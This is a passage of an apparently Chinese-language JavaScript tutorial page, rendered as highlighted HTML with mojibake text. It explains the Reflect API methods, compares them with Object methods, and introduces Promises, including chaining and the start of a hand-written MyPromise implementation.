<span class="hljs-variable language_">this</span>.<span class="hljs-property">bar</span> = value;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">const</span> receiver = &#123;&#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(obj2, <span class="hljs-string">&#x27;prop&#x27;</span>, <span class="hljs-number">10</span>, receiver);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(receiver.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 10</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.has(target, propertyKey)</strong></p><ul><li>åˆ¤æ–­å¯¹è±¡æ˜¯å¦åŒ…å«æŸå±æ€§</li><li>ç­‰åŒäº propertyKey in target</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>)); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">has</span>(obj, <span class="hljs-string">&#x27;toString&#x27;</span>)); <span class="hljs-comment">// true (ç»§æ‰¿å±æ€§)</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.deleteProperty(target, propertyKey)</strong></p><ul><li>åˆ é™¤å¯¹è±¡çš„æŸå±æ€§</li><li>ç­‰åŒäº delete target[propertyKey]</li><li>è¿”å›å¸ƒå°”å€¼è¡¨ç¤ºæ˜¯å¦åˆ é™¤æˆåŠŸ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">y</span>: <span class="hljs-number">2</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">deleteProperty</span>(obj, <span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj); <span class="hljs-comment">// &#123; y: 2 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.construct(target, argumentsList[, newTarget])</strong></p><ul><li>è°ƒç”¨æ„é€ å‡½æ•°åˆ›å»ºå®ä¾‹</li><li>ç­‰åŒäº new target(â€¦args)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> p = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(<span class="hljs-title class_">Person</span>, [<span class="hljs-string">&#x27;Alice&#x27;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.apply(target, thisArgument, argumentsList)</strong></p><ul><li>è°ƒç”¨å‡½æ•°</li><li>ç­‰åŒäº Function.prototype.apply.call(target, thisArgument, argumentsList)</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">$&#123;name&#125;</span>!`</span>;<br>&#125;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">apply</span>(greet, <span class="hljs-literal">null</span>, [<span class="hljs-string">&#x27;Alice&#x27;</span>]);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// &#x27;Hello, Alice!&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.defineProperty(target, propertyKey, attributes)</strong></p><ul><li>å®šä¹‰æˆ–ä¿®æ”¹å¯¹è±¡å±æ€§</li><li>ç­‰åŒäº Object.defineProperty()</li><li>è¿”å›å¸ƒå°”å€¼è¡¨ç¤ºæ˜¯å¦æˆåŠŸ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>,<br>  <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,<br>  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span><br>&#125;);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(success); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">name</span>); <span class="hljs-comment">// &#x27;Bob&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.getOwnPropertyDescriptor(target, propertyKey)</strong></p><ul><li>è·å–å±æ€§æè¿°ç¬¦</li><li>ç­‰åŒäº Object.getOwnPropertyDescriptor()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> desc = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getOwnPropertyDescriptor</span>(obj, <span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(desc.<span class="hljs-property">value</span>); <span class="hljs-comment">// &#x27;Alice&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(desc.<span class="hljs-property">enumerable</span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.getPrototypeOf(target)</strong></p><ul><li>è·å–å¯¹è±¡çš„åŸå‹å¯¹è±¡</li><li>ç­‰åŒäº Object.getPrototypeOf()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj) === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.setPrototypeOf(target, prototype)</strong></p><ul><li>è®¾ç½®å¯¹è±¡çš„åŸå‹å¯¹è±¡</li><li>ç­‰åŒäº Object.setPrototypeOf()</li><li>è¿”å›å¸ƒå°”å€¼è¡¨ç¤ºæ˜¯å¦è®¾ç½®æˆåŠŸ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> proto = &#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, proto);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>); <span class="hljs-comment">// &#x27;bar&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.isExtensible(target)</strong></p><ul><li>åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯æ‰©å±•</li><li>ç­‰åŒäº Object.isExtensible()</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">isExtensible</span>(obj)); <span class="hljs-comment">// true</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">preventExtensions</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">isExtensible</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.preventExtensions(target)</strong></p><ul><li>é˜»æ­¢å¯¹è±¡æ‰©å±•</li><li>ç­‰åŒäº Object.preventExtensions()</li><li>è¿”å›å¸ƒå°”å€¼è¡¨ç¤ºæ˜¯å¦æˆåŠŸ</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> &#125;;<br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">preventExtensions</span>(obj);<br>obj.<span class="hljs-property">y</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// é™é»˜å¤±è´¥æˆ–ä¸¥æ ¼æ¨¡å¼ä¸‹æŠ¥é”™</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj); <span class="hljs-comment">// &#123; x: 1 &#125;</span><br></code></pre></td></tr></table></figure><p><strong>Reflect.ownKeys(target)</strong></p><ul><li>è·å–å¯¹è±¡æ‰€æœ‰è‡ªæœ‰å±æ€§é”®ï¼ˆåŒ…æ‹¬ Symbol å’Œä¸å¯æšä¸¾å±æ€§ï¼‰</li><li>ç­‰åŒäº Object.getOwnPropertyNames(target).concat(Object.getOwnPropertySymbols(target))</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  [<span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;id&#x27;</span>)]: <span class="hljs-number">123</span>,<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span><br>&#125;;<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">&#x27;hidden&#x27;</span>, &#123;<br>  <span class="hljs-attr">value</span>: <span class="hljs-string">&#x27;secret&#x27;</span>,<br>  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span><br>&#125;);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(obj)); <br><span class="hljs-comment">// [&#x27;name&#x27;, &#x27;age&#x27;, &#x27;hidden&#x27;, Symbol(id)]</span><br></code></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆä½¿ç”¨-Reflectï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨-Reflectï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨ Reflectï¼Ÿ"></a>ä¸ºä»€ä¹ˆä½¿ç”¨ Reflectï¼Ÿ</h3><p>é™¤äº†ä¸Šé¢è®²è¿‡çš„ Reflect çš„å‡ ä¸ªè®¾è®¡ç›®çš„å¤–ï¼Œè¿˜åŒ…æ‹¬ä¸‹é¢çš„åŸå› ï¼š</p><p><strong>æ”¯æŒ receiver å‚æ•°</strong></p><p>Reflect çš„ get&#x2F;set æ–¹æ³•æ”¯æŒ receiver å‚æ•°ï¼Œå¯æ”¹å˜ getter&#x2F;setter ä¸­çš„ this æŒ‡å‘ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">_value</span>: <span class="hljs-number">0</span>,<br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_value</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> receiver = &#123; <span class="hljs-attr">_value</span>: <span class="hljs-number">42</span> &#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(obj, <span class="hljs-string">&#x27;value&#x27;</span>, receiver)); <span class="hljs-comment">// 42</span><br></code></pre></td></tr></table></figure><h3 id="Reflectå’ŒObjectæ–¹æ³•çš„åŒºåˆ«"><a href="#Reflectå’ŒObjectæ–¹æ³•çš„åŒºåˆ«" class="headerlink" title="Reflectå’ŒObjectæ–¹æ³•çš„åŒºåˆ«"></a>Reflectå’ŒObjectæ–¹æ³•çš„åŒºåˆ«</h3><table><thead><tr><th align="left">æ“ä½œ</th><th align="left">Object æ–¹æ³•</th><th align="left">Reflect æ–¹æ³•</th><th align="left">ä¸»è¦åŒºåˆ«</th></tr></thead><tbody><tr><td align="left">è·å–å±æ€§æè¿°ç¬¦</td><td align="left">getOwnPropertyDescriptor</td><td align="left">getOwnPropertyDescriptor</td><td align="left">ç›¸åŒ</td></tr><tr><td align="left">å®šä¹‰å±æ€§</td><td align="left">defineProperty</td><td align="left">defineProperty</td><td align="left">Reflect è¿”å›å¸ƒå°”å€¼è€Œéå¯¹è±¡</td></tr><tr><td align="left">è·å–åŸå‹</td><td align="left">getPrototypeOf</td><td align="left">getPrototypeOf</td><td align="left">Reflect å‚æ•°éå¯¹è±¡ä¼šæŠ›å‡ºé”™è¯¯</td></tr><tr><td align="left">è®¾ç½®åŸå‹</td><td align="left">setPrototypeOf</td><td align="left">setPrototypeOf</td><td align="left">Reflect è¿”å›å¸ƒå°”å€¼</td></tr><tr><td align="left">æ‰©å±•æ€§æ£€æŸ¥</td><td align="left">isExtensible</td><td align="left">isExtensible</td><td align="left">Reflect å‚æ•°éå¯¹è±¡ä¼šæŠ›å‡ºé”™è¯¯</td></tr><tr><td align="left">é˜»æ­¢æ‰©å±•</td><td align="left">preventExtensions</td><td align="left">preventExtensions</td><td align="left">Reflect è¿”å›å¸ƒå°”å€¼</td></tr><tr><td align="left">å±æ€§æšä¸¾</td><td align="left">keys + getOwnPropertyNames</td><td align="left">ownKeys</td><td align="left">Reflect è¿”å›æ‰€æœ‰é”®ï¼ŒåŒ…æ‹¬ä¸å¯æšä¸¾å’Œ Symbol</td></tr><tr><td align="left">å‡½æ•°è°ƒç”¨</td><td align="left">-</td><td align="left">apply</td><td align="left">æ— ç›´æ¥å¯¹åº”æ–¹æ³•</td></tr><tr><td align="left">æ„é€ å‡½æ•°è°ƒç”¨</td><td align="left">-</td><td align="left">construct</td><td align="left">æ— ç›´æ¥å¯¹åº”æ–¹æ³•</td></tr><tr><td align="left">å±æ€§å­˜åœ¨æ£€æŸ¥</td><td align="left">-</td><td align="left">has</td><td align="left">å¯¹åº” in æ“ä½œç¬¦</td></tr><tr><td align="left">å±æ€§åˆ é™¤</td><td align="left">-</td><td align="left">deleteProperty</td><td align="left">å¯¹åº” delete æ“ä½œç¬¦</td></tr></tbody></table><h1 id="Promiseã€Iterator-Generatorã€Async-Await"><a href="#Promiseã€Iterator-Generatorã€Async-Await" class="headerlink" title="Promiseã€Iterator&#x2F;Generatorã€Async&#x2F;Await"></a>Promiseã€Iterator&#x2F;Generatorã€Async&#x2F;Await</h1><h2 id="Promiseï¼šå¼‚æ­¥ç¼–ç¨‹çš„åŸºçŸ³"><a href="#Promiseï¼šå¼‚æ­¥ç¼–ç¨‹çš„åŸºçŸ³" class="headerlink" title="Promiseï¼šå¼‚æ­¥ç¼–ç¨‹çš„åŸºçŸ³"></a>Promiseï¼šå¼‚æ­¥ç¼–ç¨‹çš„åŸºçŸ³</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong></p><ul><li>çŠ¶æ€æœºï¼šPromise æ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼ŒåŒ…å«ä¸‰ç§çŠ¶æ€ï¼š<ul><li>Pendingï¼ˆè¿›è¡Œä¸­ï¼‰</li><li>Fulfilledï¼ˆå·²æˆåŠŸï¼‰</li><li>Rejectedï¼ˆå·²å¤±è´¥ï¼‰</li></ul></li><li>ä¸å¯é€†æ€§ï¼šçŠ¶æ€ä¸€æ—¦æ”¹å˜ï¼ˆä» Pending â†’ Fulfilled æˆ– Pending â†’ Rejectedï¼‰å°±ä¸å¯é€†è½¬ï¼Œä¼šä¸€ç›´ä¿æŒè¿™ä¸ªç»“æœï¼Œè¿™æ—¶å°±ç§°ä¸º resolvedï¼ˆå·²å®šå‹ï¼‰</li></ul><p><strong>åŸºæœ¬ç”¨æ³•</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> promise = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">// å¼‚æ­¥æ“ä½œ</span><br>  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> success = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() &gt; <span class="hljs-number">0.5</span>;<br>    success ? <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&#x27;æ“ä½œæˆåŠŸ&#x27;</span>) : <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;æ“ä½œå¤±è´¥&#x27;</span>));<br>  &#125;, <span class="hljs-number">1000</span>);<br>&#125;);<br><br>promise<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">result</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error))<br>  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;æ— è®ºæˆåŠŸå¤±è´¥éƒ½ä¼šæ‰§è¡Œ&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>Promise é™æ€æ–¹æ³•</strong></p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">Promise.resolve()</td><td align="left">åˆ›å»ºå·²è§£å†³çš„ Promise</td><td align="left">Promise.resolve(42)</td></tr><tr><td align="left">Promise.reject()</td><td align="left">åˆ›å»ºå·²æ‹’ç»çš„ Promise</td><td align="left">Promise.reject(new Error())</td></tr><tr><td align="left">Promise.all()</td><td align="left">æ‰€æœ‰ Promise æˆåŠŸæ—¶æ‰æˆåŠŸ</td><td align="left">Promise.all([p1, p2])</td></tr><tr><td align="left">Promise.race()</td><td align="left">ç¬¬ä¸€ä¸ªå®Œæˆçš„ Promise å†³å®šç»“æœ</td><td align="left">Promise.race([p1, p2])</td></tr><tr><td align="left">Promise.allSettled()</td><td align="left">æ‰€æœ‰ Promise å®Œæˆåè¿”å›ç»“æœ</td><td align="left">Promise.allSettled([p1, p2])</td></tr><tr><td align="left">Promise.any()</td><td align="left">ä»»ä¸€ Promise æˆåŠŸå³æˆåŠŸ</td><td align="left">Promise.any([p1, p2])</td></tr></tbody></table><p><strong>Promise é“¾å¼è°ƒç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;ç½‘ç»œé”™è¯¯&#x27;</span>);<br>    <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">json</span>();<br>  &#125;)<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-title function_">processData</span>(data))<br>  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">processed</span> =&gt;</span> <span class="hljs-title function_">saveData</span>(processed))<br>  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-title function_">handleError</span>(error));<br></code></pre></td></tr></table></figure><p><strong>å®ç°åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPromise</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">&#x27;pending&#x27;</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onFulfilledCallbacks</span> = [];<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span> = [];<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = value =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">&#x27;fulfilled&#x27;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> = value;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onFulfilledCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>());<br>      &#125;<br>    &#125;;<br><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = reason =&gt; &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = <span class="hljs-string">&#x27;rejected&#x27;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span> = reason;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">fn</span> =&gt;</span> <span class="hljs-title function_">fn</span>());<br>      &#125;<br>    &#125;;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-title function_">executor</span>(resolve, reject);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      <span class="hljs-title function_">reject</span>(error);<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-title function_">then</span>(<span class="hljs-params">onFulfilled, onRejected</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyPromise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleFulfilled</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>          <span class="hljs-keyword">typeof</span> onFulfilled === <span class="hljs-string">&#x27;function&#x27;</span><br>            ? <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFulfilled</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>))<br>            : <span class="hljs-title function_">resolve</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>          <span class="hljs-title function_">reject</span>(error);<br>        &#125;<br>      &#125;;<br><br>      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRejected</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>          <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">&#x27;function&#x27;</span><br>            ? <span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onRejected</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span>))<br>            : <span class="hljs-title function_">reject</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">reason</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>          <span class="hljs-title function_">reject</span>(error);<br>        &#125;<br>      &#125;;<br><br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;fulfilled&#x27;</span>) &#123;<br>        <span class="hljs-built_in">setTimeout</span>(handleFulfilled, <span class="hljs-number">0</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> === <span class="hljs-string">&#x27;rejected&#x27;</span>) &#123;<br>        <span 